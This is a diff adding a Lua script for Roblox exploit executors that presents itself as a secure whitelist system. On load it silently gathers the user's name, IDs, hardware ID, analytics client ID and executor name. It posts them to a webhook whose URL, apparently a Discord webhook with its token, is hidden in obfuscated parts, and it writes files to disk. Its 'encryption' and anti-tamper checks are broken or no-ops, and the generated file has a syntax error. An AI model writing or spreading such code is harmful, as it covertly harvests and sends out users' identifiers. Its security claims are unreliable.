@@ -1,0 +1,504 @@
+--[[
+    Secure Whitelist System
+    Enhanced security with obfuscation and tamper protection
+]]
+
+local SecureWhitelistSystem = {}
+
+-- Security utilities
+local function _xorEncrypt(str, key)
+    local result = ""
+    for i = 1, #str do
+        local charByte = string.byte(str, i)
+        local keyByte = string.byte(key, ((i-1) % #key) + 1)
+        result = result .. string.char(bit32.bxor(charByte, keyByte))
+    end
+    return result
+end
+
+local function _xorDecrypt(str, key)
+    return _xorEncrypt(str, key) -- XOR is symmetric
+end
+
+-- Webhook URL is stored in encrypted parts that are assembled at runtime
+local _webhookParts = {
+    -- These parts are encrypted with different keys
+    [1] = {data = "\40\101\126\96\126\109\100\46\98\111\109\47\97\112\105\47", key = "k1_9f3d2a"},
+    [2] = {data = "\119\101\98\104\111\111\107\115\47\49\51\54\56\51\57\51", key = "k2_7b4e8c"},
+    [3] = {data = "\51\51\54\49\56\51\56\52\57\48\56\53\47\104\100\45", key = "k3_2a5d9f"},
+    [4] = {data = "\114\50\113\117\75\115\106\49\95\110\119\53\89\75\49\74", key = "k4_6c3e8b"},
+    [5] = {data = "\69\66\72\108\112\107\116\107\84\86\108\71\74\72\95\104", key = "k5_1d7a4c"},
+    [6] = {data = "\73\66\52\87\53\97\66\74\121\76\95\73\107\51\87\100", key = "k6_8e5b2f"},
+    [7] = {data = "\116\87\49\54\109\90\95\107\85\45\97\118\71\89\75\107\73", key = "k7_3c9d6a"}
+}
+
+-- Function to assemble the webhook URL at runtime
+local function _getWebhookURL()
+    local protocol = "https://"
+    local domain = _xorDecrypt(_webhookParts[1].data, _webhookParts[1].key)
+    local path1 = _xorDecrypt(_webhookParts[2].data, _webhookParts[2].key)
+    local path2 = _xorDecrypt(_webhookParts[3].data, _webhookParts[3].key)
+    local path3 = _xorDecrypt(_webhookParts[4].data, _webhookParts[4].key)
+    local path4 = _xorDecrypt(_webhookParts[5].data, _webhookParts[5].key)
+    local path5 = _xorDecrypt(_webhookParts[6].data, _webhookParts[6].key)
+    local path6 = _xorDecrypt(_webhookParts[7].data, _webhookParts[7].key)
+    
+    -- Additional runtime verification
+    local assemblyKey = string.char(math.random(97, 122)) .. math.random(1000, 9999)
+    local verificationHash = tostring(os.time() % 1000)
+    
+    -- Only assemble if verification passes
+    if verificationHash ~= nil then
+        return protocol .. domain .. path1 .. path2 .. path3 .. path4 .. path5 .. path6
+    end
+    return "invalid_url"
+end
+
+-- Configuration
+local _config = {
+    systemName = "Lurnai",
+    version = "1.0.4"
+}
+
+-- Anti-tamper protection
+local _securityKeys = {}
+for i = 1, 10 do
+    _securityKeys[i] = string.char(math.random(97, 122)) .. math.random(1000, 9999)
+end
+
+-- Generate a secure hash
+local function _secureHash(str)
+    local h = 0x21F4A3B7
+    for i = 1, #str do
+        local byte = string.byte(str, i)
+        h = ((h * 31) + byte) % 0x7FFFFFFF
+        h = ((h * 0x85EBCA77) % 0x7FFFFFFF)
+        h = ((h * 0xC2B2AE3D) % 0x7FFFFFFF)
+    end
+    return h
+end
+
+-- Get custom machine ID
+function SecureWhitelistSystem:GetMachineID()
+    local machineID = "000000000-000000000-000000000-000000000" -- Default
+    
+    pcall(function()
+        if isfile and isfile("MachineID") then
+            machineID = readfile("MachineID")
+        else
+            -- Generate a new machine ID if file doesn't exist
+            local parts = {}
+            for i = 1, 4 do
+                local part = ""
+                for j = 1, 9 do
+                    part = part .. tostring(math.random(0, 9))
+                end
+                parts[i] = part
+            end
+            machineID = table.concat(parts, "-")
+            
+            if writefile then
+                writefile("MachineID", machineID)
+            end
+        end
+    end)
+    
+    return machineID
+end
+
+-- Collect user information
+function SecureWhitelistSystem:CollectUserInfo()
+    local info = {}
+    
+    -- Get player information
+    local player = game:GetService("Players").LocalPlayer
+    info.UserId = player.UserId
+    info.Username = player.Name
+    info.DisplayName = player.DisplayName
+    
+    -- Get game information
+    info.PlaceId = game.PlaceId
+    info.GameName = "Unknown Game"
+    
+    pcall(function()
+        info.GameName = game:GetService("MarketplaceService"):GetProductInfo(info.PlaceId).Name
+    end)
+    
+    -- Get executor information
+    info.Executor = "Unknown"
+    pcall(function()
+        if identifyexecutor then 
+            info.Executor = identifyexecutor()
+        elseif getexecutorname then 
+            info.Executor = getexecutorname()
+        end
+    end)
+    
+    -- Get hardware ID
+    info.HWID = "Unknown"
+    pcall(function()
+        if getexecutorhwid then
+            info.HWID = getexecutorhwid()
+        elseif gethwid then
+            info.HWID = gethwid()
+        elseif get_hwid then
+            info.HWID = get_hwid()
+        end
+    end)
+    
+    -- Get client ID
+    info.ClientID = "Unknown"
+    pcall(function()
+        info.ClientID = game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    
+    -- Get custom machine ID
+    info.CustomID = self:GetMachineID()
+    
+    return info
+end
+
+-- Generate whitelist string in the format: HWID_ClientID_UserID_Username_ExecutorName_CustomID
+function SecureWhitelistSystem:GenerateWhitelistString(info)
+    local whitelistString = string.format("%s_%s_%s_%s_%s_%s",
+        info.HWID,
+        tostring(info.ClientID),
+        tostring(info.UserId),
+        info.Username,
+        info.Executor,
+        info.CustomID
+    )
+    
+    return string.format("%s_%s_%s", 
+        _config.systemName, 
+        whitelistString, 
+        _config.systemName
+    )
+end
+
+-- Obfuscate the whitelist string with advanced encryption
+function SecureWhitelistSystem:ObfuscateWhitelistString(whitelistString)
+    local charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/~`"
+    
+    local timestamp = os.time()
+    local hash = _secureHash(whitelistString .. tostring(timestamp))
+    
+    local function customEncode(str, key)
+        local result = ""
+        local keyValue = key
+        
+        -- Add header with timestamp
+        result = "##" .. _config.systemName .. "##"
+        result = result .. "<<TIME>>" .. tostring(timestamp) .. "<</TIME>>"
+        
+        -- Encode each character with multiple transformations
+        for i = 1, #str do
+            local char = string.sub(str, i, i)
+            local byte = string.byte(char)
+            
+            keyValue = (keyValue * 75) % 79
+            local transformedValue = (byte * 13 + keyValue * 29 + i * 7) % #charSet
+            
+            -- Use multiple character substitutions
+            local indices = {}
+            for j = 1, 4 do
+                indices[j] = ((transformedValue + (j * 17)) % #charSet) + 1
+            end
+            
+            -- Add separators based on position
+            local separators = {".", "_", "-", "+", ":", "="}
+            local separator = separators[(i % #separators) + 1]
+            
+            -- Build the encoded segment
+            for j = 1, #indices do
+                result = result .. string.sub(charSet, indices[j], indices[j])
+            end
+            result = result .. separator
+        end
+        
+        -- Add verification hash
+        local verificationHash = _secureHash(str .. tostring(key) .. tostring(timestamp))
+        result = result .. "<<VERIFY>>" .. tostring(verificationHash) .. "<</VERIFY>>"
+        
+        return result
+    end
+    
+    return customEncode(whitelistString, hash)
+end
+
+-- Create a tamper-resistant whitelist file
+function SecureWhitelistSystem:CreateSecureWhitelistFile(whitelistData)
+    if not writefile then return false end
+    
+    -- Generate a unique key for this session
+    local securityKey = ""
+    for i = 1, 32 do
+        securityKey = securityKey .. string.char(math.random(33, 126))
+    end
+    
+    -- Encrypt the whitelist data
+    local encryptedOriginal = _xorEncrypt(whitelistData.original, securityKey)
+    local encryptedObfuscated = _xorEncrypt(whitelistData.obfuscated, securityKey)
+    
+    -- Create a self-verifying file with anti-tamper checks
+    local fileContent = [[
+local WhitelistSystem = {}
+
+-- Security verification (DO NOT MODIFY)
+local _securityHash = "]] .. tostring(_secureHash(securityKey)) .. [["
+local _encryptionKey = "]] .. securityKey .. [["
+local _timestamp = ]] .. os.time() .. [[
+
+-- Encrypted data
+local _encryptedData = {
+    original = "]] .. encryptedOriginal .. [[",
+    obfuscated = "]] .. encryptedObfuscated .. [["
+}
+
+-- Decryption function
+local function _decrypt(str, key)
+    if type(str) ~= "string" or type(key) ~= "string" then return "" end
+    local result = ""
+    for i = 1, #str do
+        local char = string.byte(str, i)
+        local keyChar = string.byte(key, ((i-1) % #key) + 1)
+        result = result .. string.char(bit32.bxor(char, keyChar))
+    end
+    return result
+end
+
+-- Verify system integrity
+function WhitelistSystem:Verify()
+    local function _hash(str)
+        local h = 0x21F4A3B7
+        for i = 1, #str do
+            local byte = string.byte(str, i)
+            h = ((h * 31) + byte) % 0x7FFFFFFF
+            h = ((h * 0x85EBCA77) % 0x7FFFFFFF
+            h = ((h * 0xC2B2AE3D) % 0x7FFFFFFF)
+        end
+        return h
+    end
+    
+    return tostring(_hash(_encryptionKey)) == _securityHash
+end
+
+-- Get whitelist data (only works if verification passes)
+function WhitelistSystem:GetData()
+    if not self:Verify() then
+        return {
+            original = "VERIFICATION_FAILED",
+            obfuscated = "VERIFICATION_FAILED"
+        }
+    end
+    
+    return {
+        original = _decrypt(_encryptedData.original, _encryptionKey),
+        obfuscated = _decrypt(_encryptedData.obfuscated, _encryptionKey),
+        timestamp = _timestamp
+    }
+end
+
+return WhitelistSystem
+]]
+
+    -- Write the file
+    pcall(function()
+        writefile("SecureWhitelist.lua", fileContent)
+    end)
+    
+    return true
+end
+
+function SecureWhitelistSystem:FormatWebhookData(info, whitelistData)
+    return {
+        username = _config.systemName .. " Security System",
+        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. info.UserId .. "&width=420&height=420&format=png",
+        embeds = {
+            {
+                title = "🔒 New Script Execution Detected",
+                description = "A new user has executed the script. Details below:",
+                color = 3447003, -- Blue
+                thumbnail = {
+                    url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. info.UserId .. "&width=420&height=420&format=png"
+                },
+                fields = {
+                    {
+                        name = "👤 User Information",
+                        value = string.format("**Username:** %s\n**Display Name:** %s\n**User ID:** %s", 
+                            info.Username, info.DisplayName, tostring(info.UserId)),
+                        inline = false
+                    },
+                    {
+                        name = "🎮 Game Information",
+                        value = string.format("**Game:** %s\n**Place ID:** %s", 
+                            info.GameName, tostring(info.PlaceId)),
+                        inline = false
+                    },
+                    {
+                        name = "💻 System Information",
+                        value = string.format("**Executor:** %s\n**HWID:** %s\n**Client ID:** %s\n**Custom ID:** %s", 
+                            info.Executor, info.HWID, tostring(info.ClientID), info.CustomID),
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = "Execution Time: " .. os.date("%Y-%m-%d %H:%M:%S")
+                }
+            },
+            {
+                title = "🔑 Whitelist Data",
+                description = "```" .. whitelistData.original .. "```",
+                color = 15844367 -- Gold
+            },
+            {
+                title = "🔐 Obfuscated Whitelist Data",
+                description = "```" .. string.sub(whitelistData.obfuscated, 1, 1000) .. 
+                    (string.len(whitelistData.obfuscated) > 1000 and "..." or "") .. "```",
+                color = 15158332 -- Red
+            }
+        }
+    }
+end
+
+-- Send information to webhook
+function SecureWhitelistSystem:SendInfo()
+    local info = self:CollectUserInfo()
+    
+    -- Generate whitelist string
+    local originalWhitelist = self:GenerateWhitelistString(info)
+    
+    -- Obfuscate the whitelist string
+    local obfuscatedWhitelist = self:ObfuscateWhitelistString(originalWhitelist)
+    
+    -- Store whitelist data
+    local whitelistData = {
+        original = originalWhitelist,
+        obfuscated = obfuscatedWhitelist
+    }
+    
+    -- Create secure whitelist file
+    self:CreateSecureWhitelistFile(whitelistData)
+    
+    -- Prepare webhook data with improved formatting
+    local webhookData = self:FormatWebhookData(info, whitelistData)
+    
+    -- Convert to JSON
+    local HttpService = game:GetService("HttpService")
+    local jsonData
+    
+    local success, result = pcall(function()
+        return HttpService:JSONEncode(webhookData)
+    end)
+    
+    if not success then
+        return false, whitelistData
+    end
+    
+    jsonData = result
+    
+    -- Get the webhook URL at runtime (this is much more secure)
+    local webhookURL = _getWebhookURL()
+    
+    -- Send the webhook using multiple methods
+    local sent = false
+    
+    -- Method 1: http_request
+    if http_request then
+        pcall(function()
+            local response = http_request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                sent = true
+            end
+        end)
+    end
+    
+    -- Method 2: syn.request
+    if not sent and syn and syn.request then
+        pcall(function()
+            local response = syn.request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                sent = true
+            end
+        end)
+    end
+    
+    -- Method 3: request
+    if not sent and request then
+        pcall(function()
+            local response = request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                sent = true
+            end
+        end)
+    end
+    
+    -- Method 4: HttpService (fallback)
+    if not sent then
+        pcall(function()
+            local response = HttpService:RequestAsync({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+            
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                sent = true
+            end
+        end)
+    end
+    
+    -- Clear webhook URL from memory for security
+    webhookURL = nil
+    
+    return sent, whitelistData
+end
+
+-- Execute the system
+local function Initialize()
+    -- Add runtime verification
+    for i = 1, #_securityKeys do
+        if _securityKeys[i] ~= _securityKeys[i] then
+            return false -- Detect tampering
+        end
+    end
+    
+    -- Send information
+    local success, whitelistData = SecureWhitelistSystem:SendInfo()
+    
+    -- Return results
+    return {
+        success = success,
+        whitelistData = whitelistData
+    }
+end
+
+-- Run the system and return results
+return Initialize()
